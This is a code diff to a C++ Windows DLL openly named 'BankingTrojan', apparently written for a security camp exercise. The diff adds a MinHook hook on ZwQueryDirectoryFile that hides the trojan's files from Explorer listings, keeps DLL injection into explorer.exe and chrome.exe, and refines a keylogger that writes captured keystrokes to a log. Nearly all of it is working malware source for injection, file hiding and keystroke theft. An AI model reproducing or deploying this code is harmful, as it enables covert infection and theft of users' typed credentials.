@@ -2,30 +2,45 @@
 	BankingTrojan
 	Author:Dinlon5566
 	Email:  admin@dinlon5566.com
-
+	Environment: VS19
 	This project is for "TeamT5 Security Camp 2025 實作題目" only.
 */
 
 #include "pch.h"
 #include "Windows.h"
 #include <iostream>
+
 #include <tlhelp32.h>
 #include <psapi.h>    // GetModuleBaseNameW function
 #include <processthreadsapi.h>
+
+
+// For Keylogger
 #include <wchar.h>
 #include <fstream>
 #include <string>
 #include <map>
 #include <mutex>
 
+// For MinHook
+#include "types.h"
+#include "include/MinHook.h"
+#if defined _M_X64
+#pragma comment(lib, "libMinHook.x64.lib")
+#elif defined _M_IX86
+#pragma comment(lib, "libMinHook.x86.lib")
+#endif
 
+// Debug Message Box Print
 #define DEBUG 1
 
 const wchar_t dllName[] = L"BankingTrojan.dll";
 const wchar_t targetProcessName[] = L"chrome.exe";
 const std::string string_dllName = "BankingTrojan.dll";
 
+// Function declaration
 bool getDLLPath(wchar_t*);
+DWORD WINAPI ExplorerMainThread(LPVOID);
 
 /*
 	Logger
@@ -68,18 +83,13 @@ public:
 	}
 
 
-	void log(const std::wstring& logName, const std::wstring& message,bool changeline=0) {
+	void log(const std::wstring& logName, const std::wstring& message) {
 		std::lock_guard<std::mutex> lock(mtx);
 		auto it = logFiles.find(logName);
-		if (it != logFiles.end() && changeline ) {
-			if (changeline)
-			{
-				*(it->second) << message << std::endl;
-			}
-			else
-			{
-				*(it->second) << message;
-			}
+		if (it != logFiles.end()) {
+			// flush without std::endl
+			*(it->second) << message ;
+			it->second->flush();
 		}
 	}
 
@@ -303,16 +313,20 @@ bool TrojanLoader(const wchar_t* dllPath) {
 	// First injection to explorer.exe,then inject to chrome.exe
 
 	// explorer.exe
-	DWORD targetPID = 0;
+	DWORD targetPID ;
 	const DWORD waitInterval = 1000;
+	DWORD explorerThreadId = 0;
 
 	//explorer.exe
-	wchar_t exploreName[] = L"explorer.exe";
-	while (!IsProcessRunning(exploreName, &targetPID))
+	// Beause debug API hook was fail, so inject to explorer.exe.
+	targetPID = 0;
+	const wchar_t explorerProcessName[] = L"explorer.exe";
+	while (!IsProcessRunning(explorerProcessName, &targetPID))
 	{
 		Sleep(waitInterval);
 	}
 	DLLinject(targetPID, dllPath);
+
 
 	// chrome.exe
 	targetPID = 0;
@@ -327,44 +341,176 @@ bool TrojanLoader(const wchar_t* dllPath) {
 }
 
 /*
-	Explorer functions	
-	hook the  FindFirstFileW & FindNextFileW，and drop dllName
+	Explorer functions
 
-	TODO
+	Debug API Hook was fail QQ
+	https://github.com/Dinlon5566/IT_Reverse_Engineering/blob/main/Dx25/apiHooker.cpp
 
+	MinHook
+	https://github.com/zeze-zeze/2021iThome/blob/master/Explorer%E4%BD%A0%E6%80%8E%E9%BA%BC%E6%B2%92%E6%84%9F%E8%A6%BA/Rootkit/Rootkit/dllmain.cpp
 */
-typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR, LPWIN32_FIND_DATAW);
-typedef BOOL(WINAPI* FindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);
 
-FindFirstFileW_t OriginalFindFirstFileW = NULL;
-FindNextFileW_t OriginalFindNextFileW = NULL;
-
-HANDLE WINAPI HookedFindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
-{
-	HANDLE hFind = OriginalFindFirstFileW(lpFileName, lpFindFileData);
-	if (hFind != INVALID_HANDLE_VALUE)
-	{
-		if (_wcsicmp(lpFindFileData->cFileName, dllName) == 0)
-		{
-			return OriginalFindFirstFileW(L"*", lpFindFileData);
-			if(DEBUG)
-				MessageBoxW(NULL, L"Find!", L"HookedFindFirstFileW", MB_OK);
+/*
+* //Debug API Hook function
+bool explorerStayDebugEvent() {
+	DEBUG_EVENT debugEvent;
+	DWORD dwStat;
+	while (WaitForDebugEvent(&debugEvent, INFINITE)) {
+		dwStat = DBG_CONTINUE;
+		/*
+		if (debugEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
+			doCreateEvent(&debugEvent);
 		}
+		else if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
+		{
+			doExceptionEvent(&debugEvent);
+		}
+		else if (debugEvent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
+			printf("Process %d is down!\n", debugEvent.dwProcessId);
+			break;
+		}
+		ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, dwStat);
 	}
-	return hFind;
+
+
+	return 1;
+
+};
+*/
+
+int cnt = 0;
+typedef NTSTATUS(WINAPI* ZWQUERYDIRECTORYFILE)(
+	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FileInformationClassEx FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
+	);
+ZWQUERYDIRECTORYFILE fpZwQueryDirectoryFile = NULL;
+
+
+
+// 根據 FileInformationClass 回傳 FileInformation 的 FileName
+WCHAR* GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
+{
+	switch (fileInformationClass)
+	{
+	case FileInformationClassEx::FileDirectoryInformation:
+		return ((FileDirectoryInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileFullDirectoryInformation:
+		return ((FileFullDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileIdFullDirectoryInformation:
+		return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileBothDirectoryInformation:
+		return ((FileBothDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileIdBothDirectoryInformation:
+		return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileNamesInformation:
+		return ((FileNamesInformationEx*)fileInformation)->FileName;
+	default:
+		return NULL;
+	}
 }
 
-BOOL WINAPI HookedFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
+// 根據 FileInformationClass 回傳 FileInformation 的 NextEntryOffset
+ULONG GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
 {
-	BOOL result;
-	while ((result = OriginalFindNextFileW(hFindFile, lpFindFileData)) != 0)
+	switch (fileInformationClass)
 	{
-		if (_wcsicmp(lpFindFileData->cFileName, dllName) != 0)
-		{
-			return result;
-		}
+	case FileInformationClassEx::FileDirectoryInformation:
+		return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileFullDirectoryInformation:
+		return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileIdFullDirectoryInformation:
+		return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileBothDirectoryInformation:
+		return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileIdBothDirectoryInformation:
+		return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileNamesInformation:
+		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
+	default:
+		return 0;
 	}
-	return result;
+}
+
+// 根據 FileInformationClass 設定 FileInformation 的 NextEntryOffset
+void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
+{
+	switch (fileInformationClass)
+	{
+	case FileInformationClassEx::FileDirectoryInformation:
+		((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileFullDirectoryInformation:
+		((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileIdFullDirectoryInformation:
+		((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileBothDirectoryInformation:
+		((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileIdBothDirectoryInformation:
+		((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileNamesInformation:
+		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	}
+}
+
+// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "BankingTrojan" 字串的檔案
+NTSTATUS DetourZwQueryDirectoryFile(
+	HANDLE                 FileHandle,
+	HANDLE                 Event,
+	PIO_APC_ROUTINE        ApcRoutine,
+	PVOID                  ApcContext,
+	PIO_STATUS_BLOCK       IoStatusBlock,
+	PVOID                  FileInformation,
+	ULONG                  Length,
+	FileInformationClassEx FileInformationClass,
+	BOOLEAN                ReturnSingleEntry,
+	PUNICODE_STRING        FileName,
+	BOOLEAN                RestartScan
+) {
+	// 1. 呼叫原本的 ZwQueryDirectoryFile，取得檔案結構
+	NTSTATUS status = fpZwQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
+
+	// 2. 確認是不是目標的 FileInformationClass
+	if (NT_SUCCESS(status) && (FileInformationClass == FileInformationClassEx::FileDirectoryInformation || FileInformationClass == FileInformationClassEx::FileFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdFullDirectoryInformation || FileInformationClass == FileInformationClassEx::FileBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileIdBothDirectoryInformation || FileInformationClass == FileInformationClassEx::FileNamesInformation)) {
+		PVOID pCurrent = FileInformation;
+		PVOID pPrevious = NULL;
+		do {
+			// 3. 透過檔名判斷是不是要隱藏的檔案
+			if (std::wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"BankingTrojan") == 0) {
+				// 4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry
+				ULONG nextEntryOffset = GetFileNextEntryOffset(pCurrent, FileInformationClass);
+				if (nextEntryOffset != 0) {
+					int bytes = (DWORD)Length - ((ULONG)pCurrent - (ULONG)FileInformation) - nextEntryOffset;
+					RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + nextEntryOffset), (DWORD)bytes);
+				}
+				// 如果已經是最後一個檔案了，就把上一個 Entry 的 NextEntryOffset 改成 0
+				else {
+					if (pCurrent == FileInformation)status = 0;
+					else SetFileNextEntryOffset(pPrevious, FileInformationClass, 0);
+					break;
+				}
+			}
+			else {
+				// 5. 不隱藏的檔案，就加上 NextEntryOffset 繼續判斷下一個檔案，直到 NextEntryOffset 等於 0 為止
+				pPrevious = pCurrent;
+				pCurrent = (BYTE*)pCurrent + GetFileNextEntryOffset(pCurrent, FileInformationClass);
+			}
+		} while (GetFileNextEntryOffset(pPrevious, FileInformationClass) != 0);
+	}
+	return status;
 }
 
 
@@ -373,16 +519,75 @@ bool explorerMain( ) {
 	if (!getDLLPath(DLLPath)) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
-
-
-
 		return 0;
 	}
+	
+	/*
+	*      Debug API Hook was fail
+	*
+	// set debuger mode
+	if (!DebugActiveProcess(targetPID)) {
+		if(DEBUG)
+			MessageBoxW(NULL, L"Fail to DebugActiveProcess", L"ExplorerMain", MB_OK);
+		return 0;
+	}
+	//explorerStayDebugEvent();
+	*/
 
+	// MinHook
+	/*
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
+		return 0;
+	}
+	*/
+	//--------------
+
+
+	// 取得 ntdll.dll 的 handle
+	HINSTANCE hDLL = LoadLibrary(L"ntdll.dll");
+	if (!hDLL) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to LoadLibrary", L"ExplorerMain", MB_OK);
+		return 1;
+	}
+
+	// 從 ntdll.dll 找到 ZeQueryDirectoryFile
+	void* ZwQueryDirectoryFile = (void*)GetProcAddress(hDLL, "ZwQueryDirectoryFile");
+	// show addr
+	if (!ZwQueryDirectoryFile) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to GetProcAddress", L"ExplorerMain", MB_OK);
+		return 1;
+	}
+
+	// 用 Hook 把 ZwQueryDirectoryFile 竄改成我們定義的 DetourZwQueryDirectoryFile
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ExplorerMain", MB_OK);
+		return 1;
+	}
+	int status = MH_CreateHook(ZwQueryDirectoryFile, &DetourZwQueryDirectoryFile, reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile));
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"ExplorerMain", MB_OK);
+		return 1;
+	}
+
+	// 啟用 Hook
+	status = MH_EnableHook(ZwQueryDirectoryFile);
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"ExplorerMain", MB_OK);
+		return 1;
+	}
+
+	//--------------
 	//SetFileAttributesW(DLLPath, FILE_ATTRIBUTE_HIDDEN);
+
 	if(DEBUG) 
 		MessageBoxW(NULL, L"Success run to explorer.exe to END", L"ExplorerMain", MB_OK);
-	//HookIAT(GetModuleHandleW(NULL));
 	return 1;
 }
 
@@ -416,6 +621,7 @@ DWORD WINAPI ChromeMainThread(LPVOID lpParam)
 
 /*
 	Key logger functions
+	https://github.com/shubhangi-singh21/Keylogger/
 */
 
 int keyLoggerMain() {
@@ -435,13 +641,13 @@ int keyLoggerMain() {
 					logBankingTrojanKeylogger(L"[BACKSPACE]");
 					break;
 				case VK_LBUTTON:
-					logBankingTrojanKeylogger(L"[LBUTTON]");
+					//logBankingTrojanKeylogger(L"[LBUTTON]");
 					break;
-				case VK_RBUTTON:
-					logBankingTrojanKeylogger(L"[RBUTTON]");
+				case VK_RBUTTON: 
+					//logBankingTrojanKeylogger(L"[RBUTTON]");
 					break;
 				case VK_RETURN:
-					logBankingTrojanKeylogger(L"[ENTER]");
+					logBankingTrojanKeylogger(L"[ENTER]\n");
 					break;
 				case VK_TAB:
 					logBankingTrojanKeylogger(L"[TAB]");
@@ -455,10 +661,10 @@ int keyLoggerMain() {
 				case VK_MENU:
 					logBankingTrojanKeylogger(L"[Alt]");
 					break;
-				case VK_CAPITAL:
+				case VK_CAPITAL: 
 					logBankingTrojanKeylogger(L"[CAPS Lock]");
 					break;
-				case VK_SPACE:
+				case VK_SPACE: 
 					logBankingTrojanKeylogger(L"[SPACE]");
 					break;
 				}
@@ -466,6 +672,11 @@ int keyLoggerMain() {
 					continue;
 				}
 				else {
+					bool isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+					if (!isShiftPressed && key >= 'A' && key <= 'Z') {
+						key = tolower(key);
+					}
+
 					logBankingTrojanKeylogger(std::wstring(1, key).c_str());
 				}
 			}
